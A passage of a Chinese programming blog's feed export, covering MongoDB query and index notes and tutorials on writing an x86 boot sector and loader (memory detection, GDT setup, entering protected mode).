plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">统计集合所有的记录数</span><br><span class="line">db.集合.count()</span><br><span class="line"></span><br><span class="line">统计userid为1003的记录数</span><br><span class="line">db.集合.count(&#123;&#x27;userid&#x27;:&#x27;1003&#x27;&#125;)</span><br><span class="line"></span><br><span class="line">返回topN</span><br><span class="line">db.集合.find().limit(N)</span><br><span class="line"></span><br><span class="line">前N个不要</span><br><span class="line">db.集合.find().skip(N)</span><br></pre></td></tr></table></figure><ul><li>排序</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1为升序、2为降序</span><br><span class="line">db.集合.find().sort(&#123;userid:-1,count:1&#125;) 对userid降序，count升序</span><br><span class="line"></span><br><span class="line">注意：skip、limit、sort在一起的时候，按照sort、skip、limit顺序，和代码编写顺序无关</span><br></pre></td></tr></table></figure><h1 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h1><p>MongoDB使用B-Tree、Mysql使用B+ Tree</p><p><img src="https://smypicture.oss-cn-beijing.aliyuncs.com/img/image-20210516132936801.png" alt="image-20210516132936801"></p><p><img src="https://smypicture.oss-cn-beijing.aliyuncs.com/img/image-20210516133029749.png" alt="image-20210516133029749"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">默认 _id 升序索引</span><br><span class="line"></span><br><span class="line">1为按升序创建索引，-1为降序</span><br><span class="line">db.集合.createIndex(&#123;&#x27;title&#x27;:1&#125;)</span><br><span class="line">db.集合.createIndex(&#123;&quot;title&quot;:1,&quot;description&quot;:-1&#125;)</span><br><span class="line"></span><br><span class="line">得到索引</span><br><span class="line">db.集合.getIndexes()</span><br><span class="line"></span><br><span class="line">删除索引</span><br><span class="line">删除集合中userid字段上的升序索引</span><br><span class="line">db.集合.dropIndex(&#123;userid:1&#125;)</span><br></pre></td></tr></table></figure><h2 id="覆盖查询"><a href="#覆盖查询" class="headerlink" title="覆盖查询"></a>覆盖查询</h2><p>当同时满足以下两个条件时，索引将涵盖查询</p><ul><li>所有查询的字段是索引的一部分；</li><li>所有返回的字段位于同一索引中。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">db.test.insert(</span><br><span class="line">&#123;</span><br><span class="line">   &quot;_id&quot;: ObjectId(&quot;53402597d852426020000002&quot;),</span><br><span class="line">   &quot;contact&quot;: &quot;987654321&quot;,</span><br><span class="line">   &quot;dob&quot;: &quot;01-01-1991&quot;,</span><br><span class="line">   &quot;gender&quot;: &quot;M&quot;,</span><br><span class="line">   &quot;name&quot;: &quot;Tom Benzamin&quot;,</span><br><span class="line">   &quot;user_name&quot;: &quot;tombenzamin&quot;</span><br><span class="line">&#125;)</span><br><span class="line">db.users.createIndex(&#123;gender:1,user_name:1&#125;)</span><br><span class="line"></span><br><span class="line">db.users.find(&#123;gender:&quot;M&quot;&#125;,&#123;user_name:1,_id:0&#125;)  查询不会被覆盖 _id在查询中会默认返回</span><br><span class="line">db.users.find(&#123;gender:&quot;M&quot;&#125;,&#123;user_name:1&#125;) 查询会被覆盖</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;博客网址：&lt;a href=&quot;http://www.shicoder.top/&quot;&gt;www.shicoder.top&lt;/a&gt;&lt;br&gt;微信：18223081347&lt;br&gt;欢迎加群聊天 ：452380935&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这次我们开始我们的MongoDB之旅吧&lt;/p&gt;</summary>
    
    
    
    <category term="MongoDB" scheme="http://www.shicoder.top/categories/MongoDB/"/>
    
    
    <category term="导航" scheme="http://www.shicoder.top/tags/%E5%AF%BC%E8%88%AA/"/>
    
    <category term="分享" scheme="http://www.shicoder.top/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>操作系统实现-loader</title>
    <link href="http://www.shicoder.top/posts/4161701290.html"/>
    <id>http://www.shicoder.top/posts/4161701290.html</id>
    <published>2022-04-27T02:01:54.000Z</published>
    <updated>2022-05-05T13:32:42.848Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p></blockquote><p>大家好呀，终于我们到了操作系统的loader部分了，loader也是操作系统中最重要的一个部分，承接上面的boot，启下下面的kernel，那我们就开始吧!!!</p><span id="more"></span><h1 id="内存检测"><a href="#内存检测" class="headerlink" title="内存检测"></a>内存检测</h1><p>在loader中，最重要的一点就是检测内存，检测一些系统参数，到时候给kernel使用，那么下面我们就介绍下loader中如何检测内存。还是一样，我们先看下检测内存的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">detect_memory:</span><br><span class="line">    ; 置为0</span><br><span class="line">    xor ebx, ebx</span><br><span class="line"></span><br><span class="line">    ; es:di赋值</span><br><span class="line">    mov ax, 0</span><br><span class="line">    mov es, ax</span><br><span class="line">    mov edi, ards_buffer</span><br><span class="line"></span><br><span class="line">    mov edx, 0x534d4150 ;固定签名</span><br><span class="line"></span><br><span class="line">.next:</span><br><span class="line">    mov eax, 0xe820</span><br><span class="line">    mov ecx, 20</span><br><span class="line">    ; 执行系统调用</span><br><span class="line">    int 0x15</span><br><span class="line"></span><br><span class="line">    ; 检测cf标志位</span><br><span class="line">    jc error</span><br><span class="line">    ; 将缓存指针指向下一个结构体</span><br><span class="line">    add di, cx</span><br><span class="line"></span><br><span class="line">    ; 将结构体数量+1</span><br><span class="line">    inc word [ards_count]</span><br><span class="line">    ; 检测ebx是否为0</span><br><span class="line">    cmp ebx, 0</span><br><span class="line">    jnz .next</span><br><span class="line"></span><br><span class="line">    mov si, detecting</span><br><span class="line">    call print</span><br></pre></td></tr></table></figure><p>注意，我们这里获取内存的方式是采用BIOS中int 0x15中子功能0xE820。我们先给出int 0x15下3个子功能的具体描述</p><ul><li>EAX&#x3D;0xE820 ：遍历主机上全部内存</li><li>AX&#x3D;0xE801：分别检测第15MB和16MB-4GB的内存</li><li>AH&#x3D;0x88：最多检测出64MB内存</li></ul><p>内存的相关值共同组成一个结构体：ARDS（地址范围描述符），共20字节如下</p><ul><li>BaseAddrLow（4字节）：基地址的低32位</li><li>BaseAddrHigh（4字节）：基地址的高32位</li><li>LengthLow（4字节）：内存长度的低32位，以字节为单位</li><li>LengthHigh（4字节）：内存长度的高32位，以字节为单位</li><li>Type（4字节）：本段内存的类型</li></ul><p>返回值如下</p><ul><li>CF位：若CF位为0表示调用未出错</li><li>EAX：0x534d4150</li><li>ED:DI：ARDS的地址</li><li>ECX：写入到ARDS的字节数，一般为20字节</li><li>EBX：下一个ARDS的地址，当CF&#x3D;0，且EBX&#x3D;0，表示结束</li></ul><p>通过上述代码，就可以将ARDS的个数存在ards_count中，将每一个ARDS的值放在ards_buffer中。</p><h1 id="准备进入保护模式"><a href="#准备进入保护模式" class="headerlink" title="准备进入保护模式"></a>准备进入保护模式</h1><p>进入保护模式需要三个步骤</p><ul><li>打开A20</li><li>加载GDT</li><li>将cr0的pe位置1</li></ul><h2 id="全局描述符表"><a href="#全局描述符表" class="headerlink" title="全局描述符表"></a>全局描述符表</h2><p>在实模式下，访问一个地址的方式为</p><p>段地址 &lt;&lt; 4 + 偏移地址</p><p>但是在进入保护模式后，地址线是足够的，共32条，所以并不需要上面的方式，其寻址方式为</p><p>段选择子（16位）：段内偏移（32位）</p><p>我们来说下段选择子。段选择子有16位，3-15位为描述符索引（13位可表示8192个），第2位为TI位，TI&#x3D;0，表示从全局描述符表中取，TI&#x3D;1，表示从局部描述符表中取。第0-1位为特权级RPL（熟悉的特权级0-3级，用2位描述），代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">selector</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> RPL : <span class="number">2</span>; <span class="comment">// Request PL </span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> TI : <span class="number">1</span>; <span class="comment">// 0  全局描述符 1 局部描述符 LDT Local </span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> index : <span class="number">13</span>; <span class="comment">// 全局描述符表索引</span></span><br><span class="line">&#125; __attribute__((packed)) selector;</span><br></pre></td></tr></table></figure><p>上面出现了一个全局描述符表的东西（GDT），全局描述符表中每一项都是一个全局描述符，每个全局描述符都指向内存中的一个位置，下面的图展示了其关系</p><p><img src="https://smypicture.oss-cn-beijing.aliyuncs.com/img/image-20220427214535140.png" alt="image-20220427214535140"></p><p>因此如何描述这一段内存，就变得尤为重要，全局描述符的结构如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">descriptor</span> <span class="comment">/* 共 8 个字节 */</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> limit_low;      <span class="comment">// 段界限 0 ~ 15 位</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> base_low : <span class="number">24</span>;    <span class="comment">// 基地址 0 ~ 23 位 16M</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> type : <span class="number">4</span>;        <span class="comment">// 段类型</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> segment : <span class="number">1</span>;     <span class="comment">// 1 表示代码段或数据段，0 表示系统段</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> DPL : <span class="number">2</span>;         <span class="comment">// Descriptor Privilege Level 描述符特权等级 0 ~ 3</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> present : <span class="number">1</span>;     <span class="comment">// 存在位，1 在内存中，0 在磁盘上</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> limit_high : <span class="number">4</span>;  <span class="comment">// 段界限 16 ~ 19;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> available : <span class="number">1</span>;   <span class="comment">// 该安排的都安排了，送给操作系统吧</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> long_mode : <span class="number">1</span>;   <span class="comment">// 64 位扩展标志</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> big : <span class="number">1</span>;         <span class="comment">// 32 位 还是 16 位;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> granularity : <span class="number">1</span>; <span class="comment">// 粒度 4KB 或 1B</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> base_high;       <span class="comment">// 基地址 24 ~ 31 位</span></span><br><span class="line">&#125; __attribute__((packed)) descriptor;</span><br></pre></td></tr></table></figure><p><img src="https://smypicture.oss-cn-beijing.aliyuncs.com/img/image-20220427214816129.png" alt="image-20220427214816129"></p><p>则全局描述符表就有8192项，每一项都是指示一片内存的全局描述符，且表的第0项是NULL。有一个特殊寄存器GDT register指向它，只要读取这个寄存器的值，就可以找到这个表，然后通过段选择子就可以知道是哪一个下标。GDT register有48位，结构如下，0-15位共16位标识GDT界限，共65536字节，每个全局描述符8字节，所以一共65536&#x2F;8&#x3D;8192个</p><p><img src="https://smypicture.oss-cn-beijing.aliyuncs.com/img/image-20220427215152160.png" alt="image-20220427215152160"></p><p>下面给出相关代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">memory_base equ 0 ; 内存开始的位置</span><br><span class="line">; 32位下，内存为4G，然后选用的粒度为4KB</span><br><span class="line">memory_limit equ ((1024 * 1024 * 1024 * 4) / (1024 * 4) - 1) ; 内存界限 4G / 4k -1</span><br><span class="line"></span><br><span class="line">; 准备进入保护模式</span><br><span class="line">prepare_protected_mode:</span><br><span class="line"></span><br><span class="line">    cli; 关闭中断</span><br><span class="line">...</span><br><span class="line">    ; 加载GDT</span><br><span class="line">    lgdt [gdt_ptr]</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdt_ptr:</span><br><span class="line">    dw (gdt_end-gdt_base)-1</span><br><span class="line">    dd gdt_base</span><br><span class="line">gdt_base:</span><br><span class="line">    ; dd 4个字节，全局描述符表中第一个8字节为null描述符</span><br><span class="line">    dd 0,0 ;null描述符</span><br><span class="line">gdt_code:</span><br><span class="line">    dw memory_limit &amp; 0xffff ; 段界限 0 ~ 15 位</span><br><span class="line">    dw memory_base &amp; 0xffff ; 基地址 0 ~ 15 位</span><br><span class="line">    db (memory_base &gt;&gt; 16) &amp; 0xff ; 基地址 16 ~ 23 位</span><br><span class="line">    ; 存在位，1 在内存中</span><br><span class="line">    ; 特权等级 00</span><br><span class="line">    ; 1 表示代码段或数据段</span><br><span class="line">    ; 段类型 | X | C/E | R/W | A | 1 0 1 0 代码段-非依从-可读-没有访问</span><br><span class="line">    db 0b_1_00_1_1_0_1_0</span><br><span class="line">    ; 1 粒度 4KB</span><br><span class="line">    ; 1 32 位</span><br><span class="line">    ; 0 非64 位扩展标志</span><br><span class="line">    ; 0 available 随意</span><br><span class="line">    ; 段界限 16 ~ 19</span><br><span class="line">    db 0b_1_1_0_0_0000 | (memory_limit &gt;&gt; 16) &amp; 0xf</span><br><span class="line">    ; 基地址 24 ~ 31 位</span><br><span class="line">    db (memory_base &gt;&gt; 24) &amp; 0xff</span><br><span class="line"></span><br><span class="line">gdt_data:</span><br><span class="line">    dw memory_limit &amp; 0xffff ; 段界限 0 ~ 15 位</span><br><span class="line">    dw memory_base &amp; 0xffff ; 基地址 0 ~ 15 位</span><br><span class="line">    db (memory_base &gt;&gt; 16) &amp; 0xff ; 基地址 16 ~ 23 位</span><br><span class="line">    ; 存在位，1 在内存中</span><br><span class="line">    ; 特权等级 00</span><br><span class="line">    ; 1 表示代码段或数据段</span><br><span class="line">    ; 段类型 | X | C/E | R/W | A | 0 0 1 0 数据段-向上-可写-没有访问</span><br><span class="line">    db 0b_1_00_1_0_0_1_0</span><br><span class="line">    ; 1 粒度 4KB</span><br><span class="line">    ; 1 32 位</span><br><span class="line">    ; 0 非64 位扩展标志</span><br><span class="line">    ; 0 available 随意</span><br><span class="line">    ; 段界限 16 ~ 19</span><br><span class="line">    db 0b_1_1_0_0_0000 | (memory_limit &gt;&gt; 16) &amp; 0xf</span><br><span class="line">    ; 基地址 24 ~ 31 位</span><br><span class="line">    db (memory_base &gt;&gt; 24) &amp; 0xff</span><br><span class="line">gdt_end:</span><br></pre></td></tr></table></figure><p>我们重点来看重点部分，其他我们后续来说</p><p>我们前面说过，在进入保护模式前，我们要加载GDT，以便在保护模式后，其他地方要用到，所以使用如下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lgdt [gdt_ptr]; 加载GDT 将gdt_ptr所指向的区域加载到GDT register中</span><br><span class="line">sgdt [gdt_ptr]; 保存 gdt 将GDT register中的内容保存到gdt_ptr所指向的区域</span><br></pre></td></tr></table></figure><p>然后我们构建代码段和数据段的段选择子，通过选择子的结构进行构建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; 构建代码段和数据段的段选择子</span><br><span class="line">; 1 &lt;&lt; 3 =&gt; 0001 根据段选择子的结构，第0-1位为 RPL ,第2位为TI ,后面为index</span><br><span class="line">code_selector equ (1 &lt;&lt; 3)</span><br><span class="line">data_selector equ (2 &lt;&lt; 3)</span><br></pre></td></tr></table></figure><h2 id="A20线"><a href="#A20线" class="headerlink" title="A20线"></a>A20线</h2><p>其实就是为了在保护模式下可以使用更大的寻址线，因此打开A20线，方式很简单，就是将端口0x92的第1位置1就可以，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; 打开A20线</span><br><span class="line">in al, 0x92</span><br><span class="line">or al, 0b10 ; 第1位置1</span><br><span class="line">out 0x92, al</span><br></pre></td></tr></table></figure><h2 id="CR0寄存器"><a href="#CR0寄存器" class="headerlink" title="CR0寄存器"></a>CR0寄存器</h2><p>我们需要将CR0寄存器的第0位（PE位）Protection Enable打开，方式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax, cr0</span><br><span class="line">or eax, 1 ; 第0位置1</span><br><span class="line">mov cr0, eax</span><br></pre></td></tr></table></figure><h2 id="刷新流水线"><a href="#刷新流水线" class="headerlink" title="刷新流水线"></a>刷新流水线</h2><p>我们可以看到一条很奇怪的jmp指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; 用跳转来刷新缓存，启用保护模式</span><br><span class="line">jmp dword code_selector:protect_mode</span><br><span class="line"></span><br><span class="line">; 提醒编译器，到了32位的保护模式</span><br><span class="line">[bits 32]</span><br><span class="line">protect_mode:</span><br></pre></td></tr></table></figure><p>因为我们知道在跳转前是实模式，可能是16位，但是跳转到保护模式后，需要在32位下进行，那么CPU指令却不知道，仍然可能用16位的方式去解析32位指令，就会出错，因此采用1个jmp模式进行</p><h1 id="进入保护模式"><a href="#进入保护模式" class="headerlink" title="进入保护模式"></a>进入保护模式</h1><p>经过前面的步骤，我们终于来到了保护模式<code>protect_mode</code>。这个版本的操作系统我们设置的保护模式很简单，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[bits 32]</span><br><span class="line">protect_mode:</span><br><span class="line"></span><br><span class="line">    mov ax, data_selector</span><br><span class="line">    ; 初始化段寄存器</span><br><span class="line">    mov ds, ax</span><br><span class="line">    mov es, ax</span><br><span class="line">    mov fs, ax</span><br><span class="line">    mov gs, ax</span><br><span class="line">    mov ss, ax</span><br><span class="line"></span><br><span class="line">    ; 在0x7e00-0x9fbff可用区域间随便找一个位置</span><br><span class="line">    mov esp, 0x10000 ;修改栈顶</span><br><span class="line"></span><br><span class="line">    ; 因为system.bin(kernel文件夹里面的程序编译的)是从第10个扇区开始写入，写了200个扇区</span><br><span class="line">    mov edi, 0x10000;读取的目标内存</span><br><span class="line">    mov ecx, 10 ;起始扇区</span><br><span class="line">    mov bl, 200 ;扇区数量</span><br><span class="line">    call read_disk</span><br><span class="line">    ; 内核代码被放在0x10000处，所以跳转到这里执行内核代码</span><br><span class="line">    jmp dword code_selector: 0x10000</span><br></pre></td></tr></table></figure><p>我们在编译的时候，先将system.bin写入到磁盘的第10个扇区，命令如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=system.bin of=master.img bs=512 count=200 seek=10 conv=notrunc  </span><br></pre></td></tr></table></figure><p>终于我们可以编写c语言了，前面写汇编实在难受，哈哈哈。</p><p>内核的主程序在main.c中，先简单实现下把，后续再补充</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">kernel_init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> *video = (<span class="type">char</span>*)<span class="number">0xb8000</span>; <span class="comment">// 文本显示器的内存位置</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(message); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 第一个位是字符，第二个位是该字符的特性，比如是闪烁还是不闪烁等，所以每个字符要在内存位置占2个位</span></span><br><span class="line">        video[i*<span class="number">2</span>] = message[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意下0xb8000，在这个系列的第2章中，有如下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; 0xb8000 文本显示器的内存区域</span><br><span class="line">mov ax, 0xb800</span><br><span class="line">mov ds, ax</span><br><span class="line">mov byte [0], &#x27;H&#x27;</span><br></pre></td></tr></table></figure><p>0xb8000已经超过16位了，所以在实模式下，需要使用<code>( 16 位段基址 &lt;&lt; 4 ) + 16 位偏移地址</code>方式，而在保护模式下有32位，所以可以直接访问</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;博客网址：&lt;a href=&quot;http://www.shicoder.top/&quot;&gt;www.shicoder.top&lt;/a&gt;&lt;br&gt;微信：18223081347&lt;br&gt;欢迎加群聊天 ：452380935&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;大家好呀，终于我们到了操作系统的loader部分了，loader也是操作系统中最重要的一个部分，承接上面的boot，启下下面的kernel，那我们就开始吧!!!&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="http://www.shicoder.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="导航" scheme="http://www.shicoder.top/tags/%E5%AF%BC%E8%88%AA/"/>
    
    <category term="分享" scheme="http://www.shicoder.top/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>操作系统实现-boot.asm实现</title>
    <link href="http://www.shicoder.top/posts/3107354293.html"/>
    <id>http://www.shicoder.top/posts/3107354293.html</id>
    <published>2022-04-24T12:44:58.000Z</published>
    <updated>2022-05-07T02:24:57.454Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p></blockquote><p>这一次我们进入操作系统实现的真实编码， 这一次主要是完善对boot.asm文件的全部实现，开始吧。。。</p><span id="more"></span><p>首先我们先来理一下boot.asm需要干什么</p><ul><li>打印出<code>Booting System...</code></li><li>实现磁盘读写</li><li>将后续的<code>loader.asm</code>所在的区域读入到<code>0x1000</code>处，然后跳转进入<code>loader.asm</code>程序</li><li>开始执行<code>loader.asm</code>程序（这一节我们下次实现）</li></ul><h1 id="实模式下的print"><a href="#实模式下的print" class="headerlink" title="实模式下的print"></a>实模式下的print</h1><p>在我们平时编写c语言时候，可以直接使用，但是在boot.asm中，完全就没有可以用库函数，因此为了在开始打印处start boot，我们需要自己实现print</p><p>先来看下代码把</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mov si, booting</span><br><span class="line">call print</span><br><span class="line"></span><br><span class="line">print:</span><br><span class="line">    mov ah, 0x0e</span><br><span class="line">.next:</span><br><span class="line">    mov al, [si]</span><br><span class="line">    cmp al, 0</span><br><span class="line">    jz .done</span><br><span class="line">    int 0x10</span><br><span class="line">    inc si</span><br><span class="line">    jmp .next</span><br><span class="line">.done:</span><br><span class="line">    ret</span><br><span class="line">booting:</span><br><span class="line">    db &quot;Booting System...&quot;, 10, 13, 0; \n\r</span><br></pre></td></tr></table></figure><p>这段程序主要使用使用BIOS的<code>int 10h</code>来实现一个<code>print</code>功能，<code>al</code>寄存器存储要显示的字符串</p><h1 id="磁盘读写"><a href="#磁盘读写" class="headerlink" title="磁盘读写"></a>磁盘读写</h1><p>因为<code>boot.asm</code>在主引导扇区，磁盘内存太小，不能在<code>boot.asm</code>中实现<code>loader.asm</code>的功能，因此我们将<code>loader.asm</code>保存在磁盘的一个地方，在<code>boot.asm</code>中利用磁盘读的方式，将代码读入到内存的一个区域，然后跳转到那个地方</p><p>先来看下磁盘读的功能实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 